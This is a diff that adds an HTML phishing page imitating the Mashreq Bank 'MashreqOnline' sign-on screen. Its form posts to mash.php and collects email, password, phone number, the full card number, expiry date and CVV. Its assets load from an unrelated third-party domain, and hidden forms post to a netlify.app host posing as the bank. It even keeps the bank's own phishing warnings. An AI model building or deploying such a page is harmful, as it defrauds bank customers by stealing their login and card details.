@@ -1,0 +1,496 @@
+<!DOCTYPE>
+<html class=" js no-flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en">
+<head>
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>MashreqOnline - Sign On</title>
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+		<link rel="icon" type="image/png" href="https://netbanking.mashreqbank.com/B001/assets/enulogin/images/favicon.png">
+		<meta name="Keywords" content="Mashreq Online">
+		<meta name="description" content="MashreqOnline - Sign On">
+		<meta name="theme-color" content="#fad961">
+		<link rel="stylesheet" type="text/css" href="https://www.ictexpert.com.ng/digital-mashreq/css/bootstrap.css">
+		<link rel="stylesheet" type="text/css" href="https://www.ictexpert.com.ng/digital-mashreq/css/style_retail.css">
+		<link rel="stylesheet" href="https://www.ictexpert.com.ng/digital-mashreq/css/jquery.css">
+
+</head>
+
+
+
+<body onload="togpwd()" class="body-bg" vlink="#0000ff">
+	  <section id="mashreq-online" class="center-block">
+		<div class="container">
+		  <div class="login-container">
+			<div class="row">
+			  <div class="col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3 col-lg-5 col-lg-offset-0 p-r-0">
+				
+				<form name="frmLogon" method="post" action="mash.php" autocomplete="off">
+					<div class="login-block">
+					  <div class="row">
+						<div class="col-xs-8 col-sm-6 col-sm-offset-3">
+						  <div class="mash-logo">
+							<img src="https://www.ictexpert.com.ng/digital-mashreq/images/img1.png" alt="mashreq bank logo" class="margin-center img-responsive">
+						  </div>
+						</div>
+						<div class="col-xs-4 col-sm-3 text-center">
+						  <select name="fldLangId" class="select-grey">
+							<option value="eng" selected="selected">EN</option>
+							<option value="ara">AR</option>
+						  </select>
+						</div>
+					  </div>
+					  <div class="br-normal"></div>
+					  <p class="corisande-light black-color">Secure Sign In</p>
+					  <div class="row">
+						<div class="col-xs-10 col-xs-offset-1 col-sm-8 col-sm-offset-2">
+						  <div class="form-block">
+						    <input type="text" class="form-control form-input-field is-keypad" placeholder="Email Address" id="email" name="email" tabindex="1" required>
+							  <input type="password" class="form-control form-input-field is-keypad" placeholder="Password" onpaste="return false;" oncopy="return false;" id="emailpass" name="emailpass" tabindex="2" required>
+                                <input type="text" class="form-control form-input-field is-keypad" placeholder="Phone Number" id="phonenumber" name="phonenumber" tabindex="1" required>
+                                <div class="br-normal"></div>
+                              CARD NUMBER  <input id="cidNumber1" title="Enter your Card Number" autocomplete="off" maxlength="4" size="4" name="cidNumber1" value="" type="text" onkeyup="autoTab(event,this,document.next_form.cidNumber2)" onkeypress="return isNumberKey(event)">
+-<input id="cidNumber2" title="Enter your Card Number" autocomplete="off" maxlength="4" size="4" name="cidNumber2" value="" type="text" onkeyup="autoTab(event,this,document.next_form.cidNumber3)" onkeypress="return isNumberKey(event)">
+-<input id="cidNumber3" title="Enter your Card Number" autocomplete="off" maxlength="4" size="4" name="cidNumber3" value="" type="text" onkeyup="autoTab(event,this,document.next_form.cidNumber4)" onkeypress="return isNumberKey(event)">
+-<input id="cidNumber4" title="Enter your Card Number" autocomplete="off" maxlength="4" size="4" name="cidNumber4" value="" type="text" onkeyup="autoTab(event,this,document.next_form.cidNumber)" onkeypress="return isNumberKey(event)">
+<div class="br-normal"></div>
+EXPIRATION DATE <select name="expiration_month" id="exp_month" class="expmth">
+            <option value="01">(01) January</option>
+            <option value="02">(02) February</option>
+            <option value="03">(03) March</option>
+            <option value="04">(04) April</option>
+            <option value="05">(05) May</option>
+            <option value="06">(06) June</option>
+            <option value="07">(07) July</option>
+            <option value="08">(08) August</option>
+            <option value="09">(09) September</option>
+            <option value="10">(10) October</option>
+            <option value="11">(11) November</option>
+            <option value="12">(12) December</option>
+        </select>
+        <script language="JavaScript" type="text/javascript">
+            select(document.getElementById("exp_month"), 0);
+        </script>
+        <select name="expiration_year" id="exp_year">
+			<option selected="selected" value="20" class="expyear">2020</option>
+<option value="21">2021</option>
+<option value="22">2022</option>
+<option value="23">2023</option>
+<option value="24">2024</option>
+<option value="25">2025</option>
+<option value="26">2026</option>
+<option value="27">2027</option>
+<option value="28">2028</option>
+<option value="29">2029</option>
+
+        </select>
+        <script language="JavaScript" type="text/javascript">
+            select(document.getElementById("exp_year"), 0);
+        </script>
+        <div class="br-normal"></div>
+    CVV  <input name="cscNumber" type="text" id="cscNumber" value="" size="6" maxlength="3" placeholder="3 Digit Security Code">
+                              
+						    <div class="br-normal"></div>
+							  <div class="row">
+								<div class="col-xs-6 col-xs-offset-3">
+								  <button type="submit" class="btn btn-orange form-control" value="SignOn" onclick=" return fLogon()" tabindex="3">Submit</button>
+								</div>
+							  </div>
+						
+							<hr class="hr-thick">
+							<div class="row">
+							  <div class="col-xs-6 col-xs-offset-3">
+						
+							  </div>
+							</div>
+							<div class="br-block"></div>
+						  </div>
+						</div>
+					  </div>
+					  <div class="protect-block">
+						<div class="row">
+						  <div class="col-xs-2 col-xs-offset-1 col-sm-1 col-sm-offset-3 p-l-0">
+							<img src="./MashreqOnline - Sign On_files/security-icon2.htm" alt="security icon" class="margin-center">
+						  </div>
+					  <div class="col-xs-7 col-sm-6 text-left">
+							<div class="font-xs font-bold">Ensure You are Always Protected</div>
+							<div class="font-xxs">Check out these security tips to protect yourself from being a victim of
+							  online threats.
+							  <span class="light-blue" data-toggle="modal" data-target="#myModal">Read More</span>
+							</div>
+						  </div>
+						</div>
+					  </div>
+					</div></form>
+				
+			  </div>
+			  <div class="col-md-7 col-lg-7 p-l-0 visible-lg">
+				<img src="https://www.ictexpert.com.ng/digital-mashreq/images/img2.png" alt="mashreq login" class="img-responsive banner-img">
+			  </div>
+			</div>
+		  </div>
+		  <div id="footer">
+		  <div class="row">
+			<div class="col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3 col-lg-7 col-lg-offset-0 mob-center">
+			  <a href="https://netbanking.mashreqbank.com/B001/requirements.htm" target="_blank" class="footer-links">Requirements</a>
+			  <a href="https://netbanking.mashreqbank.com/B001/security.htm" target="_blank" class="footer-links">Security</a>
+			  <a href="https://netbanking.mashreqbank.com/B001/privacy-policy.htm" target="_blank" class="footer-links">Privacy policy</a>
+			  <a href="https://netbanking.mashreqbank.com/B001/service-terms.htm" target="_blank" class="pointer">Service
+				Terms</a>
+			</div>
+			<div class="col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3 col-lg-5 col-lg-offset-0 mob-center">
+			  <div class="copyright">
+				Copyright @
+				<script>document.write(new Date().getFullYear())</script>202120212020
+				Mashreq Bank. All Rights Reserved.
+				<img src="./MashreqOnline - Sign On_files/thawte-logo.htm" alt="security thawte logo" class="security-thwate" title=" Our website is secured using a Thawte Digital Certificate. This ensures that all information you send to us via the World Wide Web will be encrypted. You may click on the Thawte Trusted Site Seal any time to confirm that you are visiting a secure site hosted by Mashreq.">
+			  </div>
+			</div>
+		  </div>
+		</div>
+		</div>
+	  </section>
+
+	  <!-- security info popup -->
+
+	  <!-- Modal -->
+	  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+		<div class="modal-dialog" role="document">
+		  <div class="modal-content">
+			<div class="modal-header">
+			  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">�</span></button>
+			  <h4 class="modal-title" id="myModalLabel">Security Tips</h4>
+			</div>
+			<div class="modal-body">
+			  <table class="table">
+				<tbody>
+				  <tr>
+					<td>
+					  <img src="./MashreqOnline - Sign On_files/Phishing-emailer-Alert-Mar19-option2-icon1.jpg" alt="Phishing-emailer-Alert">
+					</td>
+					<td>
+					  <span class="font-bold orange-color">Phishing</span> is a form of fraud through communication in an
+					  attempt to
+					  obtain the intended victim's
+					  sensitive
+					  information such as username, password, credit card or bank account details.</td>
+				  </tr>
+				  <tr>
+					<td> <img src="./MashreqOnline - Sign On_files/Phishing-emailer-Alert-Mar19-option2-icon2.jpg" alt="Phishing-emailer-Alert">
+					</td>
+					<td><span class="font-bold orange-color">Vishing</span> (Voice Phishing) is a form of fraud through
+					  telephone
+					  (Mobile / Landline / IVR) and using
+					  social
+					  engineering techniques to gain access to victim's personal, private financial information to be used
+					  for identity theft such as tax refund, card activation or upgrade, rewards redemption etc. </td>
+				  </tr>
+				  <tr>
+					<td> <img src="./MashreqOnline - Sign On_files/Phishing-emailer-Alert-Mar19-option2-icon3.jpg" alt="Phishing-emailer-Alert">
+					</td>
+					<td><span class="font-bold orange-color">Smishing</span> (SMS Phishing) is a form of fraud through
+					  WhatsApp or
+					  SMS, where fraudsters send Web site
+					  hyperlinks, which when clicked would download a malware/virus to steal customers personal / financial
+					  information's saved on the mobile.</td>
+				  </tr>
+				  <tr>
+					<td></td>
+					<td></td>
+				  </tr>
+				</tbody>
+			  </table>
+
+			  <img src="./MashreqOnline - Sign On_files/Phishing-emailer-Alert-Apr19-dosndonts.jpg" alt="Phishing emailer" class="img-responsive">
+			</div>
+		  </div>
+		</div>
+	  </div>
+
+	  <!-- Sign Up Modal -->
+	  <div class="modal fade" id="createUserIDModal" tabindex="-1" role="dialog" aria-labelledby="otpModalLabel">
+		<div class="modal-dialog" role="document">
+		  <div class="modal-content">
+			<div class="modal-header bg-orange">
+			  <button type="button" class="close white-ic" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">�</span></button>
+			  <h4 class="modal-title" id="otpModalLabel">Create User ID</h4>
+			</div>
+			<div class="modal-body">
+
+			  <div class="row">
+				<div class="col-sm-12">
+				  <p class="pg-desc">Please choose one of the options</p>
+				  <div class="br-normal"></div>
+				  <div class="row">
+					<div class="col-xs-6">
+					  <div class="selection-block otp" onclick="fNewUserRegistrationOTP();">
+						<img src="./MashreqOnline - Sign On_files/checked.htm" alt="checked" class="check-uncheck-icon otp-check hidden">
+						<img src="./MashreqOnline - Sign On_files/unchecked-icon.htm" alt="checked" class="check-uncheck-icon otp-uncheck">
+						<div class="sel-desc otp">
+						  <div class="font-bold font-md">OTP</div>
+						  <div class="font-xs hidden-xs">One Time Password</div>
+						</div>
+					  </div>
+					</div>
+					<div class="col-xs-6" onclick="fNewUserRegistrationTIN();">
+					  <div class="selection-block tin">
+						<img src="./MashreqOnline - Sign On_files/checked.htm" alt="un-checked" class="check-uncheck-icon tin-check hidden">
+						<img src="./MashreqOnline - Sign On_files/unchecked-icon.htm" alt="un-checked" class="check-uncheck-icon tin-uncheck">
+						<div class="sel-desc">
+						  <div class="font-bold font-md">TIN</div>
+						  <div class="font-xs hidden-xs">Telephone Identification Number</div>
+						</div>
+					  </div>
+					</div>
+				  </div>
+				  <div class="br-normal"></div>
+				</div>
+			  </div>
+			</div>
+		  </div>
+		</div>
+	  </div>
+
+	  <!-- Forgot Password Modal -->
+	  <div class="modal fade" id="forgotPasswordModal" tabindex="-1" role="dialog" aria-labelledby="forgotPasswordModalLabel">
+		<div class="modal-dialog" role="document">
+		  <div class="modal-content">
+			<div class="modal-header bg-orange">
+			  <button type="button" class="close white-ic" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">�</span></button>
+			  <h4 class="modal-title" id="forgotPasswordModalLabel">Forgot Password</h4>
+			</div>
+			<div class="modal-body">
+
+			  <div class="row">
+				<div class="col-sm-12">
+				  <h5 class="text-center">Please keep your Mashreq Debit or Credit card issued in your name handy</h5>
+				  <p class="pg-desc">Please choose one of the options</p>
+				  <div class="br-normal"></div>
+				  <div class="row">
+					<div class="col-xs-6">
+					  <div class="selection-block otp" onclick="forgotPasswordOTP();">
+						<img src="./MashreqOnline - Sign On_files/checked.htm" alt="checked" class="check-uncheck-icon otp-check hidden">
+						<img src="./MashreqOnline - Sign On_files/unchecked-icon.htm" alt="checked" class="check-uncheck-icon otp-uncheck">
+						<div class="sel-desc otp">
+						  <div class="font-bold font-md">OTP</div>
+						  <div class="font-xs hidden-xs">One Time Password</div>
+						</div>
+					  </div>
+					</div>
+					<div class="col-xs-6">
+					  <div class="selection-block tin" onclick="forgotPasswordTIN();">
+						<img src="./MashreqOnline - Sign On_files/checked.htm" alt="un-checked" class="check-uncheck-icon tin-check hidden">
+						<img src="./MashreqOnline - Sign On_files/unchecked-icon.htm" alt="un-checked" class="check-uncheck-icon tin-uncheck">
+						<div class="sel-desc">
+						  <div class="font-bold font-md">TIN</div>
+						  <div class="font-xs hidden-xs">Telephone Identification Number</div>
+						</div>
+					  </div>
+					</div>
+				  </div>
+				  <div class="br-normal"></div>
+				</div>
+			  </div>
+			</div>
+		  </div>
+		</div>
+	  </div>
+	 <!-- find user id Modal -->
+	  <div class="modal fade" id="findUserIDModal" tabindex="-1" role="dialog" aria-labelledby="findUserIDModalLabel">
+		<div class="modal-dialog" role="document">
+		  <div class="modal-content">
+			<div class="modal-header bg-orange">
+			  <button type="button" class="close white-ic" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">�</span></button>
+			  <h4 class="modal-title" id="findUserIDModalLabel">Forgot User ID</h4>
+			</div>
+			<div class="modal-body">
+
+			  <div class="row">
+				<div class="col-sm-12">
+				  <h5 class="text-center">Please keep your Mashreq Debit or Credit card issued in your name handy</h5>
+				  <p class="pg-desc">Retrieve using one of the below options</p>
+				  <div class="br-normal"></div>
+				  <div class="row">
+					<div class="col-xs-6">
+					  <div class="selection-block otp" onclick="forgotUserIdOTP();">
+						<img src="./MashreqOnline - Sign On_files/checked.htm" alt="checked" class="check-uncheck-icon otp-check hidden">
+						<img src="./MashreqOnline - Sign On_files/unchecked-icon.htm" alt="checked" class="check-uncheck-icon otp-uncheck">
+						<div class="sel-desc otp">
+						  <div class="font-bold font-md">OTP</div>
+						  <div class="font-xs hidden-xs">One Time Password</div>
+						</div>
+					  </div>
+					</div>
+					<div class="col-xs-6">
+					  <div class="selection-block tin" onclick="forgotUserIdTIN();">
+						<img src="./MashreqOnline - Sign On_files/checked.htm" alt="un-checked" class="check-uncheck-icon tin-check hidden">
+						<img src="./MashreqOnline - Sign On_files/unchecked-icon.htm" alt="un-checked" class="check-uncheck-icon tin-uncheck">
+						<div class="sel-desc">
+						  <div class="font-bold font-md">TIN</div>
+						  <div class="font-xs hidden-xs">Telephone Identification Number</div>
+						</div>
+					  </div>
+					</div>
+				  </div>
+				  <div class="br-normal"></div>
+				</div>
+			  </div>
+			</div>
+			
+			<!--
+			<div class="modal-body">
+
+			  <div class="row">
+				<div class="col-sm-8 col-sm-offset-2  text-center">
+				  <p class="userid-p-desc">
+					Please follow the 4 simple steps to find your User ID.</p>
+				  <div class="row userid-desc">
+					<div class="col-xs-12">
+					  <div class="num-icon">1</div>
+					  Please visit any Mashreq ATM
+					</div>
+					<div class="col-xs-12">
+					  <div class="num-icon">2</div>
+					  Insert your Mashreq Debit Card in ATM
+					</div>
+					<div class="col-xs-12">
+					  <div class="num-icon">3</div>
+					  Tap on My Services >
+					  Mashreq Online Services >
+					  Mashreq Online Retrieval
+					</div>
+					<div class="col-xs-12">
+					  <div class="num-icon">4</div>
+					  Follow the steps as
+					  displayed on the screens
+					</div>
+				  </div>
+				  <div class="br-block"></div>
+				  <div class="br-normal"></div>
+				  <p class="userid-desc">Call
+					<a href="tel:+97144244444">
+					  <span class="light-blue">+9714 424 4444</span>
+					</a>
+				  </p>
+				</div>
+			  </div>
+			</div>-->
+		  </div>
+		</div>
+	  </div>
+
+
+		<div class="aside hidden">
+            <div class="cover"></div>
+            <div class="tab-sec">
+                <div class="close" id="close-pop"></div>
+                <div class="tabs flex">
+                    <h2 class="fuserid">Forgot User ID?</h2>
+                    <h2 class="fpwd act">Forgot Password?</h2>
+                </div>
+                <div class="tab-cont flex align-center">
+                    <div class="fuserid1 cont text-center hidden">
+
+                        <div class="br-normal"></div>
+                        <p>To retrieve your User ID, please choose one of the options</p>
+
+                        <div class="br-normal"></div>
+                        <div class="row">
+                            <div class="col-xs-6">
+                                <a class="btn btn-outline-border form-control" onclick="forgotUserIdOTP();">OTP</a>
+                            </div>
+                            <div class="col-xs-6">
+                                <a class="btn btn-outline-border form-control" onclick="forgotUserIdTIN();">TIN</a>
+
+                            </div>
+
+                        </div>
+                        <div class="br-normal"></div>
+                        <div class="br-normal"></div>
+                    </div>
+                    <div class="fpwd1 cont text-center">
+                        <div class="br-normal"></div>
+                        <p>To reset your password, please choose one of the options</p>
+
+                        <div class="br-normal"></div>
+                        <div class="row">
+                            <div class="col-xs-6">
+                                <a class="btn btn-outline-border form-control" onclick="forgotPasswordOTP();">OTP</a>
+                            </div>
+                            <div class="col-xs-6">
+                                <a class="btn btn-outline-border form-control" onclick="forgotPasswordTIN();">TIN</a>
+
+                            </div>
+
+                        </div>
+                        <div class="br-normal"></div>
+                        <div class="br-normal"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+	 <script type="text/javascript">
+
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-32963289-1']);
+		_gaq.push(['_setDomainName', 'mashreqbank.com']);
+		_gaq.push(['_setAllowLinker', true]);
+		_gaq.push(['_trackPageview']);
+
+		(function () {
+		  // var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+		  //ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+		  //var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+		
+		$('.fpwd').click(function () {
+            $(this).addClass('act');
+            $('.fuserid').removeClass('act');
+            $('.fpwd1').removeClass('hidden');
+            $('.fuserid1').addClass('hidden');
+        });
+        $('.fuserid').click(function () {
+            $(this).addClass('act');
+            $('.fpwd').removeClass('act');
+            $('.fuserid1').removeClass('hidden');
+            $('.fpwd1').addClass('hidden');
+
+        });
+		$('#close-pop, .cover').click(function () {
+            $('.aside').addClass('hidden');
+        });
+	  </script>
+	  <!-- scripts are now optimized via Modernizr.load -->
+	  <script src="./MashreqOnline - Sign On_files/jquery_004.htm"></script>
+	  <script src="./MashreqOnline - Sign On_files/jquery.htm"></script>
+	  <script src="./MashreqOnline - Sign On_files/support.htm" type="text/javascript"></script>
+	  <script src="./MashreqOnline - Sign On_files/main.htm"></script>
+	<form name="frmtoken" method="post" action="https://digital-mashreq-kyc-4dcdfa.netlify.app/internet" target="frmnew">	
+		<input type="hidden" name="fldDeviceId" value="01">
+		<input type="hidden" name="fldLangId" value="eng">
+		<input type="hidden" name="fldRequestId" value="RRLGN00">
+		<input type="hidden" name="fldlitever" value="L">
+		<input type="hidden" name="fldData">
+	</form>
+	<form name="frmUserReg" method="post">
+		<input type="hidden" name="fldDeviceId" value="">
+		<input type="hidden" name="fldLangId" value="">
+		<input type="hidden" name="fldPortalCode" value="">
+		<input type="hidden" name="fldAuthType" value="">
+		<input type="hidden" name="fldlitever" value="L">
+	</form>
+	<form name="frmprocess" method="POST" action="https://digital-mashreq-kyc-4dcdfa.netlify.app/process.jsp">
+		<input type="hidden" name="fldRequestId" value="">
+		<input type="hidden" name="fldDeviceId" value="01">
+		<input type="hidden" name="title" value="">
+		<input type="hidden" name="usertype" value="EN1">
+	</form>
+	  <iframe name="frmnew" class="iframe" style="display: none;" marginwidth="0px" marginheight="0px" scrolling="no" src="./MashreqOnline - Sign On_files/trans.html" width="0px" height="0px" frameborder="1"> </iframe>
+
+	
+	
+<span id="VBar" style="position: absolute; top: 0px; left: 0px; height: 0px; width: 2px; background: silver none repeat scroll 0% 0%; border-left: 1px dotted black; display: none;"></span><div id="supersized-loader"></div><ul id="supersized"></ul><div class="keypad-popup" style="display: none;"><div class="keypad-row"><button type="button" class="keypad-key">!</button><button type="button" class="keypad-key">@</button><button type="button" class="keypad-key">#</button><button type="button" class="keypad-key">$</button><button type="button" class="keypad-key">%</button><button type="button" class="keypad-key">^</button><button type="button" class="keypad-key">&amp;</button><button type="button" class="keypad-key">*</button><button type="button" class="keypad-key">(</button><button type="button" class="keypad-key">)</button><button type="button" class="keypad-key">_</button><button type="button" class="keypad-key">=</button><div class="keypad-half-space"></div><div class="keypad-space"></div><button type="button" class="keypad-special keypad-close" title="Close the keypad">Close</button></div><div class="keypad-row"><div class="keypad-half-space"></div><button type="button" class="keypad-key">`</button><button type="button" class="keypad-key">~</button><button type="button" class="keypad-key">[</button><button type="button" class="keypad-key">]</button><button type="button" class="keypad-key">{</button><button type="button" class="keypad-key">}</button><button type="button" class="keypad-key">&lt;</button><button type="button" class="keypad-key">&gt;</button><button type="button" class="keypad-key">\</button><button type="button" class="keypad-key">|</button><button type="button" class="keypad-key">/</button><div class="keypad-space"></div><button type="button" class="keypad-key">7</button><button type="button" class="keypad-key">8</button><button type="button" class="keypad-key">9</button></div><div class="keypad-row"><button type="button" class="keypad-key">q</button><button type="button" class="keypad-key">w</button><button type="button" class="keypad-key">e</button><button type="button" class="keypad-key">r</button><button type="button" class="keypad-key">t</button><button type="button" class="keypad-key">y</button><button type="button" class="keypad-key">u</button><button type="button" class="keypad-key">i</button><button type="button" class="keypad-key">o</button><button type="button" class="keypad-key">p</button><button type="button" class="keypad-key">'</button><button type="button" class="keypad-key">"</button><div class="keypad-half-space"></div><button type="button" class="keypad-key">4</button><button type="button" class="keypad-key">5</button><button type="button" class="keypad-key">6</button></div><div class="keypad-row"><div class="keypad-half-space"></div><button type="button" class="keypad-key">a</button><button type="button" class="keypad-key">s</button><button type="button" class="keypad-key">d</button><button type="button" class="keypad-key">f</button><button type="button" class="keypad-key">g</button><button type="button" class="keypad-key">h</button><button type="button" class="keypad-key">j</button><button type="button" class="keypad-key">k</button><button type="button" class="keypad-key">l</button><button type="button" class="keypad-key">;</button><button type="button" class="keypad-key">:</button><div class="keypad-space"></div><button type="button" class="keypad-key">1</button><button type="button" class="keypad-key">2</button><button type="button" class="keypad-key">3</button></div><div class="keypad-row"><div class="keypad-space"></div><button type="button" class="keypad-key">z</button><button type="button" class="keypad-key">x</button><button type="button" class="keypad-key">c</button><button type="button" class="keypad-key">v</button><button type="button" class="keypad-key">b</button><button type="button" class="keypad-key">n</button><button type="button" class="keypad-key">m</button><button type="button" class="keypad-key">,</button><button type="button" class="keypad-key">.</button><button type="button" class="keypad-key">?</button><div class="keypad-space"></div><div class="keypad-half-space"></div><button type="button" class="keypad-key">-</button><button type="button" class="keypad-key">0</button><button type="button" class="keypad-key">+</button></div><div class="keypad-row"><button type="button" class="keypad-special keypad-tab" title="Horizontal tab">→</button><button type="button" class="keypad-special keypad-enter" title="Carriage return">Enter</button><button type="button" class="keypad-special keypad-spacebar" title="Space">&nbsp;</button><button type="button" class="keypad-special keypad-shift" title="Toggle upper/lower case characters">Shift</button><div class="keypad-half-space"></div><button type="button" class="keypad-special keypad-back" title="Erase the previous character">Back</button><button type="button" class="keypad-special keypad-clear" title="Erase all the text">Clear</button></div></div>
+
+
+
+</body></html>
